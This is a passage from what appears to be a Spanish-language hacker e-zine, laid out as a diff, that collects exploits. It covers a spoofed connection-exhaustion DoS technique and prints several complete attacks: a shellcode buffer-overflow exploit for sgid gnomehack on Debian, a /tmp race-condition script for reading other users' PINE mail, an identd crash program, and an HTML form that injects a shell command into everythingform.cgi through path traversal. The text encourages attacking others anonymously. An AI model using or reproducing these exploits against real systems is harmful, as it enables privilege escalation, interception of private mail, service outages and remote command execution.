+conexiones SSH por ejemplo en el ordenador de un "amigo" vuestro.
+	Si no sois tontos, ya habreis pensado en cuales van a ser
+los efectos tanto para el, como para vosotros. Tener en cuenta que
+vuestro ordenador tambien tiene que poder establecer 400 conexiones 
+simultaneas. 
+	Aqui viene por tanto la parte sensible de estos ataques, que
+es la de conseguir que el ataque vaya dirigido a la victima, pero que
+no se vuelva hacia nosotros.
+
+	El servidor tiene que mantener la lista de las conexiones que
+tiene abiertas, que si son un numero muy grande, pues supone la
+necesidad de un buen procesador y mucha memoria. Imaginemos tambien,
+poniendo por ejemplo al SSHd, que cada conexion genera un nuevo
+proceso en el servidor. Este caso no afectara para los demonios que
+esten bajo el inetd, por lo cual se recomienda su uso.
+
+      Al atacante tambien le afectan las conexiones, por lo que estos
+ataques consisten en no tener conexiones. Y como evitamos esto, pues
+de dos formas diferentes. La primera de ellas es haciendo el ataque
+distribuido. Pero en lo que trabajan estos DoS especialmente es en
+realizar las conexiones a pelo, de forma que no sean gestionadas por
+demonios que consuman recursos o la propia pila TCP/IP.
+      Y esto como va? Pues bien. Imaginemos que queremos hacer un
+ataque, anonimo por supuesto a una maquina X. Para ello necesitamos
+tener acceso a una maquina que este en el mismo cable que X. Esta es
+la condicion para hacer un "no blind spoofing", pero a pelo. La linea
+anterior es el resumen de estos ataques. De esta forma, poniendo la
+tarjeta en modo promiscuo, mandamos paquetes iniciales SYN con un
+numero de secuencia inventado y escuchamos las respuestas. A partir de
+aqui, mandamos los paquetes necesarios como para establecer y mantener
+minimamente las conexiones.
+      De esta forma, la balanza de recursos consumidos en nuestra
+maquina y en la de la victima nos es favorable. 
+      Podriamos comentar diferentes resultados de estudios realizados,
+pero se pueden resumir en que no se salva ningun Sistema
+Operativo. Mas informacion en proximos numeros de SET. 
+
+
+-( 0x07 )-
+
+Tema     : GNOMEHACK buffer overflow. GID=60 (games)
+Para     : GNU/Debian 2.2
+Patch    : Menos vicio, y mas curro.
+Creditos : Cody Tubbs (loophole of hhp) pigspigs@yahoo.com
+
+Descripcion:
+
+      Bueno, bueno. Ahora vamos con un clasico de los clasicos, que es
+este juego: el GnomeHack. Debe ser que el nombre incita a la gente,
+pero la lista de overflows para este juego va para largo.
+     De que va el juego?, pues vamos a preguntarselo al sabio apt a
+ver que nos dice:
+
+gnomehack - A port of NetHack for GNOME
+nethack - Text-based/X11 overhead view D&D-style adventure game
+
+	Vaya, vaya. Si no os queda claro de que va el juego, pues os
+lo bajais y echais una partidita. Eso si, iros buscando un
+parche... ;) Pero vamos con el tema, que es el buffer overflow...
+
+     Nos parariamos a analizarlo, pero es de los tipicos. Como podeis
+leer mas abajo, esta probado en potato. Antes de nada, mirar que
+el binario es sgid. De esta manera podreis conseguir egid=60. Y que
+podeis hacer con eso..., pues 
+
+mortiis@localhost:~$ find / -group games
+/usr/games/xgalaga
+
+Je, pues eso es lo que tengo yo. Por cierto, tengo un vicio... Es un
+fantastico juego.
+
+	   Si leeis un poco el codigo, podeis ver que utiliza dos
+variables de entorno, una de ellas que es por la que falla al
+especificar el DISPLAY al que se conecta, y la otra que es donde
+almacena los NOP y el shellcode. El exploit no tiene mas.
+
+/*
+ * (gnomehack) local buffer overflow. (gid=games(60))
+ *
+ * Author: Cody Tubbs (loophole of hhp).
+ * www.hhp-programming.net / pigspigs@yahoo.com
+ * 12/17/2000
+ *
+ * Tested on Debian 2.2, kernel 2.2.17 - x86.
+ * sgid "games"(60) by default.
+ *
+ * bash-2.03$ id
+ * uid=1000(loophole) gid=501(noc)
+ * bash-2.03$ ./h 0 0
+ * Ret-addr 0x7fffe81c, offset: 0, allign: 0.
+ * Can't resolve host name "èÿèÿèÿèÿèÿèÿèÿèÿèÿèÿèÿèÿèÿèÿèÿèÿ"!
+ * sh-2.03$ id
+ * uid=1000(loophole) gid=501(noc) egid=60(games)
+ * sh-2.03$
+ */
+
+#include <stdio.h>
+
+#define OFFSET 0
+#define ALLIGN 0
+#define NOP    0x90
+#define DBUF   256 //120(RET*30)+((RET))+132(RET*33)
+#define GID    60
+
+static char shellcode[]=
+ "\x31\xdb\x31\xc9\xbb\xff\xff\xff\xff\xb1\x00\x31\xc0"
+ "\xb0\x47\xcd\x80\x31\xdb\x31\xc9\xb3\x00\xb1\x00\x31"
+ "\xc0\xb0\x47\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0"
+ "\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08"
+ "\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8"
+ "\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x69";
+
+long get_sp(void){
+ __asm__("movl %esp,%eax");
+}
+
+void workit(char *heh){
+ fprintf(stderr, "\ngnomehack local exploit for Debian 2.2 - x86\n");
+ fprintf(stderr, "Author: Cody Tubbs (loophole of hhp)\n\n");
+ fprintf(stderr, "Usage: %s <offset> [allign(0..3)]\n", heh);
+ fprintf(stderr, "Examp: %s 0\n", heh);
+ fprintf(stderr, "Examp: %s 0 1\n", heh);
+ exit(1);
+}
+
+main(int argc, char **argv){
+ char eipeip[DBUF], buffer[4096], heh[DBUF+1];
+ int i, offset, gid, allign;
+ long address;
+
+ if(argc < 2){
+  workit(argv[0]);
+ }
+ 
+ if(argc > 1){
+  offset = atoi(argv[1]);
+ }else{
+  offset = OFFSET;
+ }
+
+ if(argc > 2){
+  allign = atoi(argv[2]);
+ }else{
+  allign = ALLIGN;
+ }
+
+ address = get_sp() - offset;
+
+ if(allign > 0){
+  for(i=0;i<allign;i++){
+   eipeip[i] = 0x69; //0x69.DOOT:D
+  }
+ }
+
+ for(i=allign;i<DBUF;i+=4){
+  *(long *)&eipeip[i] = address;
+ }
+
+ gid = GID;
+ shellcode[10] = gid;
+ shellcode[22] = gid;
+ shellcode[24] = gid;
+ 
+ for(i=0;i<(4096-strlen(shellcode)-strlen(eipeip));i++){
+  buffer[i] = NOP;
+ }
+ 
+ memcpy(heh, eipeip, strlen(eipeip));
+ memcpy(heh, "DISPLAY=", 8);//HOME||DISPLAY
+ putenv(heh);
+
+ memcpy(buffer+i, shellcode, strlen(shellcode));
+ memcpy(buffer, "HACKEX=", 7);
+ putenv(buffer);
+ 
+ fprintf(stderr, "Ret-addr %#x, offset: %d, allign: %d.\n",address, offset, all
+ign);
+ execlp("/usr/lib/games/gnomehack/gnomehack", "gnomehack", 0); //Mod path if ne
+eded.
+}
+
+
+-( 0x08 )-
+
+Tema     : Race Condition en PINE Version 4.30
+Para     : Sistemas con PINE y vi
+Patch    : Utilizar Mutt!!, que es muy bonito
+Creditos : mat@hacksware.com
+
+Descripcion:
+
+    Pues vamos con este fallo de seguridad que permite leer el correo
+de los usuarios mientras lo estan escribiendo con el PINE. Para ello,
+y antes de empezar con explicaciones, deben tener en el PINE
+habilitadas las siguientes opciones: 
+
+  [x]  enable-alternate-editor-cmd
+  [x]  enable-alternate-editor-implicitly
+  editor                   = /usr/bin/vi
+
+    Cuando editas un correo, PINE crea el fichero temporal
+/tmp/pico.<pid>, donde <pid> es el PID con el que esta corriendo el
+PINE. Aqui es donde estara el correo que la victima esta
+editando. Como podemos aprovechar en este caso que conocemos el
+nombre del fichero temporal que crea PINE?
+    Pues bien, si creamos un enlace simbolico de este fichero a uno
+que no existe, Vi seguira el enlace y creara el nuevo fichero. Es ahi,
+cuando nosotros borramos el enlace, y creamos nuestro fichero
+temporal, eso si, con permisos de escritura para la victima.
+    Aqui teneis el script que hace justo lo que esta explicado
+aqui arriba. 
+
+
+--------------------race_pine.sh start--------------------------------
+#!/bin/sh
+# Grab local pine messages
+# Usage: ./mon_pine.sh <pid of pine process>
+# victim pine must use following settings
+#
+#  mat@hacksware.com
+#  http://hacksware.com
+#
+# [x]  enable-alternate-editor-cmd
+# [x]  enable-alternate-editor-implicitly
+# editor                   = /usr/bin/vi
+#
+
+PID=$1
+PICO_FILE=`printf "/tmp/pico.%.6d" $PID`
+TRASHCAN=/tmp/.trashcan.`date|sed "s/ //g"`
+echo PICO_FILE is $PICO_FILE
+
+#if $PICO_FILE and $TRASHCAN exists, remove them
+if test -f $PICO_FILE
+then
+ rm -f $PICO_FILE
+fi
+if test -f $TRASHCAN
+then
+ rm -f $TRASHCAN
+fi
+
+ln -s $TRASHCAN $PICO_FILE
+while :
+do
+ if test -f $TRASHCAN
+ then
+  break
+ fi
+done
+
+echo Victim is Editing Pine Message
+rm -f $PICO_FILE
+echo We replace temporary file
+touch $PICO_FILE
+chmod 777 $PICO_FILE
+echo "Get the message from "$PICO_FILE
+echo "^C to break tailer"
+tail -f $PICO_FILE
+--------------------mon_pine.sh end  --------------------------------
+
+
+-( 0x09 )-
+
+Tema     : Identd Denial of Service
+Para     : SuSE
+Patch    : Actualizacion en www.suse.com
+
+Descripcion:
+
+	 Pues este programilla de apariencia inofensiva, deja KO al
+identd de la SuSE. Pero el matiz que tiene el programa esta explicado
+en el header del codigo. Y es que no nos encontramos ante un buffer
+overflow del demonio al mandarle mil y pico caracteres. El problema
+parece ser que esta en que el identd falla con cadenas muy grandes,
+pero no por no reservar un buffer lo suficientemente grande.
+
+     Aqui teneis el exploit para que le echeis un ojo:
+ 
+/*
+ * identdDoS.c 
+ * written by R00T-dude 
+ * based upon an advisory I found on sec-focus
+ * 
+ * enjoy :)  
+ * 
+ * oh, just in case you think this there is a buffer overflow
+ * possible, there ISN'T   
+ * the ident server thinks that the string send is to big so it sets a
+ * pointer to NULL 
+ * and that makes it crash !!!! 
+ * I tested this at home and it worked fine 
+ * however I an in an inet. cafe right now and this code isn't tested,
+ * so if you find mistakes in it  
+ * please don't bitch bout it (thx in advance)
+ *
+ */
+
+#include <stdio.h>
+#include <sys/socket.h>
+#include <netdb.h>
+#include <string.h>
+
+int main(int argc, char **argv)
+{
+ struct sockaddr_in sin;
+ struct hostent *hp;
+ char stuff[1200];
+ int sock, conn, i ;
+
+ if (argc < 2)
+ {
+	fprintf(stderr, " useage :: %s 127.0.0.1 ", argv[1]);
+	exit(0);
+ }
+ 
+if ( (hp = gethostbyname§argv[1]) == NULL)
+ {
+	fprintf(stderr, "hostname doesn't match !");
+	exit(0);
+ }
+ 
+ sock = socket(AF_INET, SOCK_STREAM, 0);
+ if (sock < 0)
+ {
+	fprintf(stderr, "socket() doesn't work !");
+	exit(sock);
+ }
+ 
+ sin.sin_family = AF_INET ;
+ sin.sin_port = htons(113);
+ sin.sin_addr.s_addr = inet_addr(argv[1]);
+
+ conn = connect(sock, (struct sockaddr *)&sin, sizeof(sin));
+ if (conn < 0)
+ {
+	fprintf(stderr, "connect() doesn't work !");
+	exit(conn);
+ }
+
+printf("sending stuff... "); 
+for(i=0; i  < 1100; i++)
+ {
+	strcat(stuff, "a");
+ }
+
+ send(sock, stuff, sizeof(stuff), 0);
+ close(sock);
+ printf("done  \n");
+}
+
+
+-( 0x10 )-
+
+Tema     : Fallo en everythingform.cgi. Ejecucion remota de comandos
+Para     : Buscar, la red es muy grande
+Patch    : Las palabras patch y perl no son compatibles
+Creditos : rpc
+
+Descripcion:
+
+	 Bueno, he aqui un caso tipico de como NO escribir un CGI en
+perl. Hemos cogido del advisory la parte del codigo afectada que es esta:
+
+..
+$ConfigFile = $in{config};
+..
+ open(CONFIG, "$configdir$ConfigFile") || &Error("I can\'t open/
+ $ConfigFile in the ReadConfig subroutine. Reason: $!");
+
+    Vamos, que a este cgi le podemos pasar como parametro hidden el
+config que despues lo "abre" amablemente con open(). Pues los que
+esteis familiarizados con este tipo de fallos ya sabeis lo que teneis
+que hacer.
+
+    Y como patch, pues buscar la actualizacion como siempre. Pero
+vamos, ojo con los cgi's que utiliceis, y el Servidor Web siempre con
+nobody, www-data,etc... 
+
+He aqui el ejemplo del advisory:
+
+
+<form action="http://www.conservatives.net/someplace/everythingform.cgi"
+method=POST>
+<h1>everythingform.cgi exploit</h1>
+Command: <input type=text name=config value="../../../../../../../../bin/ping
+-c 5 www.foobar.com|">
+<input type=hidden name=Name value="fuck the religious right">
+<input type=hidden name="e-mail" value="foo@bar.net">
+<input type=hidden name=FavoriteColor value=Black>
+<input type=submit value=run>
+</form>
+
+
+
+
+ *EOF*
+
